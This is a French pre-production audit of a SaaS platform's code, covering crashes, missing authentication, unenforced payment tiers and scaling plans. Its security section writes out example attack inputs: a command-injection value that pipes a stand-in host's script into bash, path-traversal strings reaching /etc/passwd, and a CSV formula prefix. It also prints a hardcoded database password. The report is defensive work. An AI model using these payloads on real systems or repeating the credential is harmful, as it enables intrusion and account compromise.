# Rapport d'audit pré-production — Digital·Humans

## Verdict

**Non — ce code ne peut pas partir en production le 1er octobre en l'état.** La raison n'est pas la masse de problèmes mais leur nature : une erreur d'exécution bloque la phase 2 de la séquence SDS dans ~50 % des cas réels (NameError sur batch impair), plusieurs routeurs entiers sont exposés sans authentification (dont un qui exécute des déploiements), l'injection de commande existe sur un endpoint public, et la frontière payante Free/Pro/Team **n'existe pas côté serveur** — n'importe quel compte gratuit peut lancer un BUILD à 1 490 €/mois de valeur. La bonne nouvelle : aucun de ces blocages n'est structurel, les correctifs sont petits et parallélisables. Avec vos agents qui exécutent et vous qui arbitrez, la vague 1 représente ≈ 45–55 h de votre temps de revue. La date tient si cette vague démarre immédiatement et si rien d'autre n'est ajouté au périmètre.

---

## Vérification des correctifs annoncés (P0–P12)

| Réf | Statut déclaré | Vérité dans le code |
|---|---|---|
| P0 | corrigé | **Partiellement vrai.** Les routes chaudes sont wrappées dans `asyncio.to_thread` (execution_routes.py:≈60, projects.py:≈330). Mais le problème persiste à trois endroits : le générateur SSE `build_progress_data` fait du `db.refresh` synchrone dans une route async (execution_routes.py:≈180), le handler WebSocket fait du SQLAlchemy sync dans sa boucle (chat_ws_routes.py:≈100), et `sophie_concierge_service.converse` (async) fait du `db.query` sync sur le endpoint public (sophie_concierge_service.py:≈190). Voir PROD-02. |
| P1 | corrigé | **Vrai côté backend** (pm_orchestrator.py est un wrapper propre). Mais l'ancienne surface vit encore côté frontend : `frontend/src/services/pmService.ts` appelle `/pm/dialogue`, `/pm/generate-prd`, etc., routes inexistantes. Pages concernées non routées, donc non visible — dette morte à supprimer, pas une panne. |
| P2 | corrigé | **Contourné, pas terminé.** config.py centralise, mais : journal_webhook.py:14 (`/root/workspace/...` en dur), sf_admin_service.py:≈200 (`/var/lib/digital-humans/livrables`), config.py:≈75-85 (défauts `/opt/digital-humans/...` qui cassent tout déploiement sans env), markdown_to_docx.py (`/tmp/puppeteer-config.json`), tests (host `172.17.0.1` en dur). |
| P3 | corrigé | **Vrai pour les agents** (MIGRATED_AGENTS + `asyncio.to_thread`, propre). Mais `subprocess.run(shell=True)` persiste avec interpolation utilisateur dans agent_tester.py:≈88 — voir SEC-02. |
| P4 | partiel | **Confirmé partiel.** Le contrôleur est mince, mais la masse a migré dans `pm_orchestrator_service_v2.py` (~2 000 lignes, god service). Le problème n'a pas été résolu, il a changé d'adresse. Voir DEBT-01. |
| P5 | corrigé | **Largement vrai** (logging_config JSON + contextvars, bien fait). Reste des `print()` en production dans llm_logger.py:≈40-85, markdown_to_docx.py, sds_template_generator.py:≈60. Mineur. |
| P6 | corrigé | **Contournable.** Le YAML est la source, mais 8 agents gardent un fallback direct : `model="gpt-4o-mini"` en dur dans salesforce_admin.py:≈255, salesforce_business_analyst.py (absent → pire : pas de fallback, return None), developer_apex.py:≈230, developer_lwc.py, data_migration.py, qa_tester.py, et `ANTHROPIC_FALLBACK_MODEL` dans research_analyst.py:≈690 et solution_architect.py:≈640. Si llm_service est indisponible au boot, la plateforme tourne silencieusement sur gpt-4o-mini au prix et à la qualité non voulus. |
| P7 | corrigé | **Vérifié OK** sur les chemins critiques (retry_routes avec try/except+rollback, get_db avec rollback en exception, database.py:≈40). |
| P8 | corrigé | **Non.** encryption.py documente une procédure et admet dans sa propre docstring que le script de ré-encryption n'existe pas ("TODO: create migration script"). rotate_credential réécrit mais ne re-chiffre pas l'existant. C'est une procédure écrite, pas une capacité. |
| P9 | corrigé | **Vérifié par absence** : `safe_content()` n'existe plus nulle part dans le paquet, aucun appel résiduel. Je ne peux pas re-tester l'ancien comportement, mais rien du flux actuel ne tronque à 4 % : les clips restants sont à 10 000–600 000 caractères. OK. |
| P10 | partiel | **Confirmé partiel, avec bug associé.** BaseAgent existe et tous héritent. Mais les `_call_llm` custom divergent et 4 d'entre eux (pm, ba, devops, trainer) ne retournent rien si `LLM_SERVICE_AVAILABLE` est False → TypeError à l'unpacking. Voir PROD-03. |
| P11 | corrigé | **Vrai.** rag_health_check au boot + erreurs RAG passées en `logger.error`. Bien. |
| P12 | partiel | **Non corrigé.** rag_service.py:≈100 relit toujours `/opt/digital-humans/rag/.env` ligne par ligne pour OPENAI_API_KEY si la variable d'env est absente. Le deuxième .env persiste en repli silencieux. |

> Deux correctifs déclarés "corrigé" ne le sont pas (P8, P12), deux autres sont contournés (P2, P6), et P0 a réapparu sur les endpoints temps réel. Les correctifs réellement solides : P1 (backend), P5, P7, P9, P11.

---

## 1. Ce qui casse en production

### PROD-01 — Phase 2 SDS plante sur tout nombre impair de BRs
- **Gravité : bloquant**
- `backend/agents/roles/salesforce_business_analyst.py:≈348` (`BusinessAnalystAgent._execute`)
- **Scénario réel** : l'orchestrateur envoie les BRs par batches de 2 (pm_orchestrator_service_v2.py:≈330, `BATCH_SIZE = 2`). Tout projet avec un nombre impair de BRs (cas majoritaire) termine sur un batch d'un seul BR. Or dans `_execute` :

```python
if batch_mode:
    prompt = get_uc_generation_prompt_batch(brs, rag_context)
logger.info(f"BusinessAnalystAgent prompt_size={len(prompt)} chars")
```

En mode single, `prompt` n'est jamais assigné → `NameError` à la ligne suivante, avant tout appel LLM. Le `run()` catch et renvoie `{"success": False, "error": "name 'prompt' is not defined"}`. L'orchestrateur loggue un warning et continue avec les BRs restants... non — il marque la tâche failed et les UCs du dernier BR manquent silencieusement dans le SDS. Le client reçoit un document incomplet après avoir payé les 40 appels précédents.
- **Correctif** :

```python
if batch_mode:
    prompt = get_uc_generation_prompt_batch(brs, rag_context)
else:
    prompt = get_uc_generation_prompt(br, rag_context)
```

- **Effort : 1 h** (correctif + un test unitaire single-BR — il n'en existe pas, c'est pour ça que ça a survécu).

### PROD-02 — WebSocket : fuite de connexion DB + boucle d'événements gelée
- **Gravité : bloquant**
- `backend/app/api/routes/orchestrator/chat_ws_routes.py:≈72-145` (`websocket_endpoint`)
- **Scénario réel** : `db = next(get_db())` ouvre une session sans jamais la fermer (le `finally` ne ferme que le socket). Chaque connexion au monitoring temps réel fuit une connexion PostgreSQL. Avec pool 20 + overflow 20, quarante onglets clients ouverts = base inaccessible pour toute la plateforme. En prime, la boucle `while True` fait `db.refresh(execution)` (sync, bloquant) toutes les 5 s par client, dans la boucle d'événements.
- **Correctif** : `try: ... finally: db.close()` et sortir le polling DB de la boucle async (lire via `asyncio.to_thread(db.refresh, execution)` ou mieux : écouter le channel PostgreSQL NOTIFY déjà existant dans notification_service).
- **Effort : 4 h.**

### PROD-03 — Quatre agents peuvent retourner None au lieu de répondre
- **Gravité : majeur**
- `salesforce_pm.py:≈430` (`PMAgent._call_llm`), `salesforce_business_analyst.py:≈430`, `salesforce_devops.py:≈345`, `salesforce_trainer.py:≈230`
- **Scénario réel** : chaque `_call_llm` est un `if LLM_SERVICE_AVAILABLE: ... return (...)` sans branche else. Si l'import de llm_service échoue au démarrage (dépendance manquante, ImportError transitoire), ces méthodes retournent `None`, et l'appelant déballe le tuple → `TypeError: cannot unpack non-sequence NoneType`, remonté comme échec agent générique après des minutes d'attente. Le fallback OpenAI qui existait a été perdu dans la refactorisation BaseAgent pour ces 4 agents — les 7 autres l'ont gardé. Comportement divergent exactement du type que P10 devait éliminer.
- **Correctif** : ajouter un `raise RuntimeError("llm_service unavailable")` explicite en fin de méthode (échec net plutôt que None), ou rétablir le fallback. Le plus sûr à 6 semaines du lancement : l'échec net.
- **Effort : 3 h.**

### PROD-04 — Le worker ARQ tue les exécutions des autres workers au démarrage
- **Gravité : majeur**
- `backend/app/workers/worker.py:≈25-45` (`startup`), `:≈62` (`job_timeout = 3600`)
- **Scénario réel A** : au démarrage, le worker marque TOUTES les exécutions `RUNNING` comme `FAILED`, sans filtrer celles qu'il possède. En déploiement rolling ou dès que vous passez à 2 workers (nécessaire dès le palier 100 clients), chaque redémarrage tue les builds sains de l'autre worker. Le garde-fou anti-ghost devient un tueur de jobs.
- **Scénario réel B** : `job_timeout = 3600`. Les commentaires du code parlent de streams de 806 s et de phases de 20–25 min ; un BUILD complet dure plus d'une heure. ARQ tuera les grosses exécutions à la limite, pile au moment du déploiement Salesforce.
- **Correctif** : filtrer le nettoyage par worker_id (colonne `locked_by` ou heartbeat) et passer `job_timeout` à 3 h pour `execute_build_task` / 2 h pour SDS.
- **Effort : 6 h.**

### PROD-05 — create_all au boot + Alembic = drift de schéma garanti
- **Gravité : majeur**
- `backend/app/main.py:≈31` (`Base.metadata.create_all(bind=engine)`)
- **Scénario réel** : au premier déploiement, create_all crée les tables depuis les modèles sans remplir `alembic_version`. Les migrations suivantes échouent ou sont sautées ; les colonnes ajoutées ensuite par Alembic manquent en prod. Et les `.sql` manuels dans `backend/migrations/` couvrent des tables déjà gérées par Alembic (double piste). Premier incident prod garanti au premier `alembic upgrade head`.
- **Correctif** : supprimer create_all du boot, `alembic stamp` initial en déploiement, et décider que `backend/migrations/*.sql` est mort (le marquer, ne plus y toucher).
- **Effort : 4 h.**

### PROD-06 — Appel LLM synchrone de 30–60 s dans la route de soumission de CR
- **Gravité : majeur**
- `backend/app/api/routes/change_requests.py:≈195` (`submit_change_request` appelle `service.analyze_impact(cr_id)` en ligne)
- **Scénario réel** : le client clique "Soumettre", la requête part dans une analyse Claude de 30–60 s. Nginx coupe à 60 s par défaut → le client voit un 504 alors que l'analyse a réussi en base. Il reclique → deuxième appel payant. À 10 clients c'est irritant, à 100 c'est des doubles factures LLM.
- **Correctif** : comme le reste du pipeline — enqueuer via ARQ (`change_request_analysis_task`), répondre 202 immédiatement.
- **Effort : 3 h.**

### PROD-07 — Singleton AgentExecutor mutable partagé entre requêtes concurrentes
- **Gravité : majeur**
- `backend/app/services/agent_executor.py:≈485` (`get_agent_executor` singleton), `self.logs`, `self.execution` mutés par requête
- **Scénario réel** : deux tests d'agents simultanés dans l'agent tester (deux onglets) mélangent leurs logs, écrasent `self.execution` — le second résultat est persisté sur l'execution_id du premier. Les artifacts sont attribués au mauvais projet.
- **Correctif** : instancier `AgentExecutor()` par appel dans `execute_agent` (il n'y a aucun état à partager), supprimer le singleton.
- **Effort : 2 h.**

### PROD-08 — Stream Anthropic sans timeout global
- **Gravité : majeur**
- `backend/app/services/llm_router_service.py:≈370` (`_call_anthropic`, `messages.stream` sans borne)
- **Scénario réel** : un stream qui hange côté API laisse la tâche worker ouverte jusqu'au job_timeout. Le heartbeat OBSERV-001 écrit mais ne coupe rien. Un incident Anthropic = tous les workers gelés ensemble.
- **Correctif** : `asyncio.wait_for` autour de la boucle de consommation avec borne par phase (SDS : 20 min, review Elena : 25 min), retry une fois, puis échec net.
- **Effort : 4 h.**

### PROD-09 — Un plan vide + un fichier XML parasite = déploiement "réussi" de rien
- **Gravité : majeur**
- `backend/agents/roles/salesforce_admin.py:≈510` (`_parse_build_v2_response`)
- **Scénario réel** : `result["success"] = len(operations) > 0` est immédiatement écrasé par `if xml_files: result["success"] = True`. Un plan JSON vide avec un fragment XML dans la réponse = succès avec zéro opération → Jordan déploie un package vide marqué succès, la phase 1 passe au vert, les phases suivantes cassent sur des objets inexistants. C'est exactement le mode d'échec "silencieux" que vos correctifs FIX-SILENCE-001 cherchaient à tuer.
- **Correctif** : `result["success"] = bool(result["operations"]) or bool(xml_files)` calculé une fois, et refuser le cas "0 opération" comme succès en phase 1.
- **Effort : 2 h.**

### PROD-10 — Secrets Salesforce : deux chemins d'écriture incompatibles
- **Gravité : majeur**
- `backend/app/api/routes/projects.py:≈245` (`update_project_settings` écrit `encrypted_value = settings["sf_consumer_secret"]` **en clair**) vs `backend/app/api/routes/wizard.py:≈320` (`_store_credential` chiffre) ; lecture dans `projects.py:≈300` (`test_salesforce_connection` lit `cred.encrypted_value` **sans déchiffrer**)
- **Scénario réel** : selon que le client a configuré via le wizard ou via la page settings, le secret est chiffré ou en clair en base — et le test de connexion lit le blob chiffré comme si c'était le secret → "OAuth failed" systématique sur le chemin wizard, secret en clair en base sur le chemin settings.
- **Correctif** : un seul chemin — tout passe par `EnvironmentService.store_credential` ; la lecture passe par `get_credential` (déchiffrement). Deux lignes à changer, une migration de re-chiffrement des lignes existantes à écrire (voir P8/SEC-06).
- **Effort : 4 h.**

---

## 2. Ce qui ne tient pas ensemble

### COH-01 — `tools/build_sds.py` est absent du paquet, et toute la phase 5 en dépend
- **Gravité : bloquant**
- `backend/agents/roles/salesforce_research_analyst.py:≈520` (`_execute_write_sds`), `backend/app/api/routes/orchestrator/execution_routes.py:≈230` (`get_sds_live_preview`), `backend/app/api/routes/sds_versions.py:≈30`
- **Scénario réel** : les trois importent `from build_sds import build_sds` après un `sys.path.insert` vers `repo_root/tools`. L'arborescence livrée (323 fichiers) ne contient **aucun répertoire `tools/`**, ni `build_sds.py`, ni `lib/collect_sds.py`, ni les 12 partials Jinja mentionnés. Si le répertoire n'est pas posé sur le serveur par un autre canal, la phase 5 échoue sur chaque SDS avec ImportError, et le client ne récupère jamais son document. Le commentaire dans research_analyst dit que c'est la voie officielle depuis l'iter 8 — c'est donc un prérequis de déploiement non documenté et non vérifiable.
- **Correctif** : soit embarquer `tools/` dans le déploiement (c'est du code de production, il doit être versionné avec le reste), soit ajouter un import guard au boot (`main.py` startup : `import build_sds` → refus de démarrer si absent). Et supprimer le `sys.path.insert` à chaud à chaque appel (fuite lente de sys.path).
- **Effort : 3 h. À vérifier par un `ls tools/` sur le serveur avant toute autre chose** — si le répertoire existe et n'a simplement pas été inclus dans le paquet d'audit, rétrograder en mineur et documenter le prérequis.

### COH-02 — Le frontend appelle `/api/executions?status=running`, qui n'existe pas
- **Gravité : mineur**
- `frontend/src/pages/Dashboard.tsx:≈95`
- **Scénario réel** : aucune route backend ne répond à `/api/executions` (le router executions est sous `/api/pm-orchestrator`). Le catch silencieux affiche "aucune représentation en cours" en permanence, même quand des builds tournent. Fonctionnalité "Work in progress" du dashboard morte depuis sa création.
- **Correctif** : pointer vers `/api/pm-orchestrator/executions?status=running` (la route existe, execution_routes.py:≈255).
- **Effort : 1 h.**

### COH-03 — Sophie concierge promet un tarif qui n'existe pas
- **Gravité : mineur (commercial, visible client)**
- `backend/prompts/agents/sophie_pm.yaml` (mode concierge : "Pro: €79/mois, 2 SDS/mois") vs `backend/alembic/versions/008_add_credits_tables.py` (seed `pro = 49.00 €, 2000 crédits`) vs `frontend/src/pages/Pricing.tsx` (49 € affiché, "Pro inclut BUILD")
- **Scénario réel** : trois sources de prix qui divergent. Sophie vend du 79 € avec 2 SDS, la page pricing affiche 49 € avec BUILD inclus, la base facture 49 € avec 15 000 crédits (migration 010). Un client qui confronte les deux vous crée un litige de facturation.
- **Correctif** : une seule source — `tier_config` en base — lue par Pricing.tsx via `/api/subscription/tiers` (existant) et citée telle quelle dans le prompt concierge.
- **Effort : 3 h.**

### COH-04 — Références mortes résiduelles
- **Gravité : mineur**
- `frontend/src/services/pmService.ts` (routes `/pm/*` inexistantes), `code_analysis_service.py:≈15` (`data/pmd-apex-rules.xml` absent du paquet → PMD retourne toujours `[]` silencieusement), `frontend/src/lib/constants.ts` (agent `PLACEHOLDER_REMOVE` dans la liste AGENTS), `backend/t_route.py` / `relaunch_build.py` / `requeue_build.py` à la racine (scripts d'opération qui seront déployés s'ils restent dans l'image).
- **Effort : 2 h au total.**

### COH-05 — Variables d'environnement lues sans garde
- **Gravité : majeur**
- `sophie_concierge_service.py:≈30` : `CHAT_IP_SALT` a un défaut public `"dh-concierge-default-salt-change-me"` — en production non configurée, les IP hachées sont réversibles par dictionnaire (engagement RGPD du modèle chat_log.py non tenu). `journal_webhook.py` est correctement refusé si non configuré (bon exemple à copier).
- **Correctif** : refus de démarrer le service concierge si le sel n'est pas posé, comme STRIPE_WEBHOOK_SECRET.
- **Effort : 1 h.**

---

## 3. Sécurité

### SEC-01 — Routeurs entiers sans authentification, dont le déploiement
- **Gravité : bloquant**
- `backend/app/api/routes/deliverables.py` (toutes les routes, aucun `get_current_user`), `backend/app/api/routes/audit.py:≈40` (`/audit/logs` : tout l'historique d'actions, IPs, user agents lisible par tous), `backend/app/api/routes/deployment.py` (generate package, rollback, **promote to environment** sans auth), `backend/app/api/routes/artifacts.py` (CRUD artifacts V2), `backend/app/api/routes/quality_gates.py`, `backend/app/api/routes/quality_dashboard.py`, `backend/app/api/routes/agent_tester.py` (tout, dont SEC-02), `backend/app/api/routes/orchestrator/execution_routes.py:≈295` (`/execute/{id}/budget` : coûts d'un client lisibles par ID par n'importe qui).
- **Scénario réel** : n'importe quel visiteur anonyme fait `GET /api/deliverables/executions/147/previews` et lit les livrables d'un client ; `POST /api/deployment/promote` avec une cible arbitraire ; `GET /api/audit/logs` pour cartographier vos clients. Vos prompts promettent le cloisonnement client comme "engagement contractuel" — l'API ne le tient pas.
- **Correctif** : ajouter `dependencies=[Depends(get_current_user)]` au niveau de chaque router, puis la vérification d'appartenance projet→user sur chaque lecture (le pattern existe et est bien fait dans business_requirements.py, l'étendre). Prévoir le cas service-à-service (workers) par un rôle interne.
- **Effort : 12 h de revue humaine** (l'ajout est trivial, la revue de chaque route pour le bon scope de possession est le vrai travail — parallélisable par routeur).

### SEC-02 — Injection de commande sur endpoint public
- **Gravité : bloquant**
- `backend/app/api/routes/agent_tester.py:≈88` (`query_org`)
- **Scénario réel** : `subprocess.run(f'sf data query --query "{soql}" --target-org ...', shell=True)` avec `soql` fourni par la requête HTTP. `?soql="; curl evil.sh | bash #"` s'exécute sur le serveur avec les droits du service. C'est une prise de contrôle totale, sans compte.
- **Correctif** : liste d'arguments, jamais shell=True, et whitelist `SELECT ... FROM` :

```python
subprocess.run(
    ["sf", "data", "query", "--query", soql, "--target-org", alias, "--json"],
    capture_output=True, text=True, timeout=30,
)
```

- **Effort : 1 h.** Et fermer l'auth du routeur (SEC-01).

### SEC-03 — Traversée de répertoires : lecture ET écriture
- **Gravité : bloquant**
- Lecture : `backend/app/main.py:≈228` (`@app.get("/download/{filename}")` → `settings.OUTPUT_DIR / filename`, sans auth ni sanitisation). Écriture : `backend/app/api/routes/documents.py:≈148` (`file_path = project_dir / file.filename`).
- **Scénario réel** : `GET /download/..%2F..%2F..%2Fetc%2Fpasswd` lit le serveur ; un upload nommé `../../app/main.py` réécrit le code du service au prochain déploiement d'un utilisateur authentifié.
- **Correctif** : `Path(file.filename).name` côté upload ; côté download, résoudre et vérifier `path.resolve().is_relative_to(settings.OUTPUT_DIR.resolve())`, et ajouter l'auth. La route `/download` devrait d'ailleurs être supprimée au profit des routes SDS existantes, authentifiées.
- **Effort : 3 h.**

### SEC-04 — Jeton Git en clair dans les logs
- **Gravité : bloquant**
- `backend/app/services/git_service.py:≈165` (`_run_git` loggue `git {' '.join(args)}`) alimenté par `clone()` qui passe `_get_auth_url()` = `https://{token}@github.com/...`.
- **Scénario réel** : chaque démarrage de BUILD écrit le Personal Access Token du client dans les journaux structurés (JSON → Loki/ELK) et dans les stderr persistés. Les journaux partent chez votre outil d'observabilité ; le token client avec eux.
- **Correctif** : masquer avant log — `args_for_log = [re.sub(r'https://[^@]+@', 'https://***@', a) for a in args]`, et faire de même sur les messages d'erreur stderr avant de les stocker en base (`last_error`, `error_log`).
- **Effort : 2 h.**

### SEC-05 — Mot de passe PostgreSQL en clair dans le dépôt, cinq fois
- **Gravité : bloquant**
- `backend/app/api/routes/blog.py:≈20`, `backend/app/services/document_generator.py:≈28`, `backend/app/services/sds_template_generator.py:≈23` (fallback `DH_SecurePass2025!` en dur), `backend/tests/test_wizard_phase5.py`, `backend/tests/test_wbs_task_types.py` (host + mot de passe).
- **Scénario réel** : le dépôt sort un jour (client enterprise on-premise, prestataire, fuite) et le mot de passe de la base est dedans. Le fait que ce soit "aussi" dans un test ne change rien : il est dans l'historique git.
- **Correctif** : supprimer tous les fallbacks, lecture exclusive depuis env ; rotation du mot de passe au moment du correctif (il est compromis dès qu'il est commité) ; tests sur SQLite ou env de test dédiée.
- **Effort : 3 h + rotation.**

### SEC-06 — Chiffrement des credentials fragile au redémarrage
- **Gravité : majeur**
- `backend/app/utils/encryption.py:≈55` (dérivation de la clé depuis SECRET_KEY en fallback) combiné à `backend/app/config.py:≈95` (SECRET_KEY auto-générée si absente en DEBUG).
- **Scénario réel** : un environnement où SECRET_KEY n'est pas posé → clé différente à chaque redémarrage → toutes les credentials chiffrées deviennent indéchiffrables, erreurs "Invalid token" en cascade, clients bloqués. En prod vous exigerez SECRET_KEY (le validateur le fait, bien), mais le fallback silencieux reste un piège sur tout nouvel environnement (staging, on-premise).
- **Correctif** : exiger `CREDENTIALS_ENCRYPTION_KEY` propre au boot en non-DEBUG, échec net sinon. Et écrire le script de rotation (P8) : ré-encrypter avec l'ancienne clé, re-stocker avec la nouvelle, colonne `key_version`.
- **Effort : 6 h** (script de rotation inclus — supprime enfin P8 pour de vrai).

### SEC-07 — JWT dans les URLs (logs serveur, historique navigateur)
- **Gravité : majeur**
- `chat_ws_routes.py:≈60` (`token` en query param), `execution_routes.py:≈165` (SSE), `business_requirements.py:≈230` (export CSV), `sds_versions.py` (downloads), `frontend` qui construit ces URLs.
- **Scénario réel** : les JWT de vos clients (valides 24 h, `ACCESS_TOKEN_EXPIRE_MINUTES=1440`) finissent dans les access logs Nginx, les logs applicatifs, l'historique navigateur. Quiconque lit les logs rejoue les sessions.
- **Correctif** : court terme — réduire la durée des tokens de service et marquer ces URLs `no-store` ; cible — cookie httpOnly pour le navigateur (le socle existe déjà : `setTokenCookie` dans api.ts) ou ticket à usage unique pour SSE/download.
- **Effort : 6 h.**

### SEC-08 — CSV injection + export non borné
- **Gravité : majeur (réduit à mineur après SEC-01 si auth correcte)**
- `backend/app/api/routes/business_requirements.py:≈245`
- **Scénario réel** : un BR dont le texte commence par `=cmd|...` (fourni par l'utilisateur ou produit par le LLM) s'exécute à l'ouverture dans Excel chez votre client. Le contenu BR est exactement le genre de texte libre que ce vecteur cible.
- **Correctif** : préfixer les cellules commençant par `= + - @` d'une apostrophe ; trois lignes.
- **Effort : 1 h.**

### SEC-09 — Endpoints publics : leads sans rate limit, sondes sans auth
- **Gravité : majeur**
- `leads.py` (`POST /leads` : aucune limite → spam de la table, coûts email), `GET /leads/count` public (énumération de votre pipeline commercial), `journal_webhook /health` révèle la config interne (chemins serveur).
- **Correctif** : `@limiter.limit("10/hour")` sur la création de lead, retirer le count du public, ne rien retourner de sensible dans les sondes publiques.
- **Effort : 2 h.**

*Non vérifié (je le dis plutôt que de l'affirmer) : la robustesse réelle du rate limiting derrière Nginx dépend de la conf Nginx (X-Forwarded-For), absente du paquet. À vérifier en déploiement.*

---

## 4. Cohérence des paliers

### TIER-01 — La frontière payante n'existe pas côté serveur
- **Gravité : bloquant (business)**
- `backend/app/api/routes/orchestrator/build_routes.py:≈150` (`start_build_phase` : auth seule, aucun check de palier), `backend/app/services/pm_orchestrator_service_v2.py` (`prepare_build_phase` vérifie le statut projet, pas le tier), `backend/app/middleware/build_enabled.py` (bloque uniquement si le **profil de déploiement** est freemium, pas selon le client), `backend/app/utils/feature_access.py:≈60` (`require_feature` défini, appliqué nulle part), `backend/app/models/user.py` (`has_build_access` défini, jamais lu par une route).
- **Scénario réel** : un compte **gratuit** fait `POST /api/pm-orchestrator/projects/42/start-build` et obtient le pipeline complet Apex/LWC/déploiement sandbox — la fonctionnalité à 1 490 €/mois. Votre page pricing affiche d'ailleurs "Pro : SDS + BUILD", ce qui contredit le modèle officiel (Pro = SDS seul) et est cohérent avec l'absence d'enforcement : tout le monde a tout.
- **Correctif** (c'est 10 lignes, c'est l'audit du choix qui compte) :

```python
# build_routes.py, en tête de start_build_phase
if not current_user.has_build_access:
    raise HTTPException(403, detail={
        "code": "tier_required", "required_tier": "team",
        "message": "La phase BUILD nécessite l'offre Team.", "upgrade_url": "/pricing"})
```

et le symétrique SDS sur `start_execution` (Free = dialogue uniquement : bloquer `execute` pour free). Appliquer aussi sur `resume_execution`, `retry_failed_execution`, `submit_change_request` (sinon contournement par re-exécution).
- **Effort : 6 h**, tests de contournement inclus.

### TIER-02 — Les quotas de crédits sont décoratifs sur le chemin principal
- **Gravité : bloquant (business)**
- `backend/app/services/llm_router_service.py:≈540` (`_credit_preflight` : `if request.user_id is None: return None`)
- **Scénario réel** : tous les appels LLM des agents passent `execution_id` mais jamais `user_id` (les agents ne le connaissent pas). Le preflight est donc un no-op sur 100 % de la production de livrables : le palier Free à 300 crédits/jour, la limite Pro, tout ça ne se déclenche que sur les chats authentifiés. Un compte gratuit peut consommer $50 d'inférence en une après-midi.
- **Correctif** : résoudre `user_id` depuis `execution_id` dans `generate_llm_response` (une requête de jointure, le pattern existe déjà pour le tier — `_resolve_tier_for_execution`, l'étendre) et propager dans LLMRequest.
- **Effort : 4 h.**

### TIER-03 — Aucune limite de projets ni de volume côté serveur
- **Gravité : majeur**
- `project_routes.py` (`create_project` : aucun appel à `check_project_limits`), `business_requirements.py` (création de BRs sans borne)
- **Scénario réel** : un compte Free crée 500 projets et 10 000 BRs → votre base gonfle, les extractions LLM tournent (TIER-02 les laisse passer), la facture Anthropic suit.
- **Correctif** : brancher `check_project_limits` (existant) dans create_project, et rejeter l'extraction si le tier ne couvre pas le nombre de BRs.
- **Effort : 3 h.**

*Vérifié positif : le webhook Stripe comme unique source de mutation du tier, la vérification de signature, le downgrade à `free` sur `subscription.deleted` — ce mécanisme-là est bien fait (stripe_service.py). Ce qui manque, c'est ce qu'il protège : rien ne le lit.*

---

## 5. Passage à l'échelle — jugement

**Le code peut-il monter en charge ? Oui jusqu'à ~100 clients, à condition de corriger PROD-02 et TIER-02 d'abord. Non au-delà sans deux interventions structurelles (stockage fichiers partagé, worker data-layer).** Les goulots, dans l'ordre où ils cassent :

1. **La boucle d'événements web** (SSE/WS faisant du SQL sync) — casse dès ~30 clients simultanés connectés au monitoring. PROD-02.
2. **Le worker ARQ** : les tasks sont async mais le code orchestrateur fait du SQLAlchemy et du SFDX synchrones dans la boucle du worker → le parallélisme `max_jobs=10` est théorique, le débit réel est ~1–2 exécutions par process. Compenser par N process workers — ça tient jusqu'à quelques centaines de clients.
3. **Le stockage fichiers local** (`outputs/`, `/tmp/sfdx_*`, livrables) : dès la 2e réplica web ou le 2e serveur worker, les fichiers produits sur l'un sont invisibles sur l'autre. **C'est le premier mur non négociable** — il impose le passage à un stockage objet avant tout scaling horizontal.
4. **ChromaDB embarqué** sur disque local : même problème, plus le single point of failure.
5. **PostgreSQL** : le schéma tient (index corrects, JSONB assumé). Les tables `llm_interactions` et `audit_logs` grossissent vite (prompts complets, 500K caractères par ligne) — prévoir rétention/partition dès 100 clients.
6. **Les appels LLM** eux-mêmes : 60–80 appels séquentiels par SDS, ~25 min ; le plafond n'est pas votre infra, c'est le débit Anthropic. Prévoir le retry 429 dès 100 clients (absent aujourd'hui : un 429 remonte comme échec d'agent).

### Configurations par palier

**10 clients (lancement — objectif 1er octobre)**
- 1 VPS : 8 vCPU / 32 Go. uvicorn ×4, ARQ ×2 process (`max_jobs=2` chacun — pas 10, c'est mensonger avec du code sync), PostgreSQL, Redis, Chroma, Nginx sur la même machine. Backups PG quotidiens + snapshot avant chaque déploiement.
- À refaire avant : la vague 1 du rapport (PROD-01/02, SEC-01/02/03, TIER-01/02), plus `/health` qui teste réellement DB/Redis/Chroma (OPS-01). Le reste peut attendre.
- Coût : ≈ 80 €/mois + LLM.

**100 clients**
- 2 × web (4 vCPU) derrière LB ; 4 × workers (8 vCPU) ; PostgreSQL managée (4 vCPU/16 Go, connexions via PgBouncer — le pool 20+40 par service × N services explose sinon) ; Redis managé ; **stockage objet S3-compatible pour outputs/livrables** (obligatoire à ce stade) ; Chroma déplacé en mode serveur sur une VM dédiée 8 Go.
- À refaire avant : 429/retry LLM, rétention audit/llm_interactions, Sentry + métriques (OPS-02), reprise de build cross-worker (voir 10 000 ci-dessous).
- Coût : ≈ 700–900 €/mois + LLM.

**1 000 clients**
- Web ×3–4 autoscale ; workers ×12 en deux files (SDS / BUILD) pour isoler les 25 min des 60 min ; PG managée 8 vCPU + replica de lecture pour analytics/audit ; Chroma → pgvector sur la PG managée (une brique de moins) ; CDN pour le frontend ; WAF + rate limiting par tier à l'edge.
- À refaire avant : asynchroniser la couche data des routes (les routes `def` sync dans le threadpool FastAPI deviennent le plafond — ~40 requêtes concurrentes par pod), file de notifications dédiée.
- Coût : ≈ 4–6 k€/mois hors LLM.

**10 000 clients — ce qui ne se corrige PAS en ajoutant des machines**
- **L'état d'exécution en mémoire des workers.** `PhaseContextRegistry` vit dans le process worker (phased_build_executor.py:≈55) : si le worker meurt, le build ne peut reprendre que sur le même process. À 10 000 clients, les workers tournent sur des dizaines de machines et redéploient en continu — il faut un état de build externalisé (DB ou Redis), c'est une refonte ciblée de l'executor, pas du scaling.
- **SQLAlchemy synchrone partout.** Le threadpool FastAPI et les `to_thread` ne passent pas à l'échelle des dizaines de milliers de requêtes/min. Passage à SQLAlchemy async : projet de fond, à planifier, pas à faire avant le lancement.
- **Le routeur LLM singleton** (`llm_router_service.py`) : usage_log et session_cost en mémoire de process — ni métriques ni limites cohérentes multi-instance. Il faut un compteur partagé (Redis) pour tout plafond global.
- **SFDX/git en /tmp local** avec état d'authentification local : les opérations Salesforce doivent devenir des unités de travail portables (credentials chiffrés en base — vous les avez — + workspace jetable par tâche). Actuellement `JordanDeployService` suppose la machine.

**Coût d'inférence à 10 000 clients — chiffrage explicite.**
Hypothèses sourcées dans votre code : un SDS ≈ 45 appels, le commentaire de migration 010 chiffre un SDS à ~$20,87 en config Marcus-Opus ; un BUILD ajoute les générations 64K tokens + reviews Elena (jusqu'à 600 000 caractères en entrée, salesforce_qa_tester.py:≈95) avec `MAX_RETRIES=3` par phase → BUILD nominal ≈ $25–45, borne haute ×3 si boucles de retry. Mix : 80 % free, 17 % pro, 3 % team.

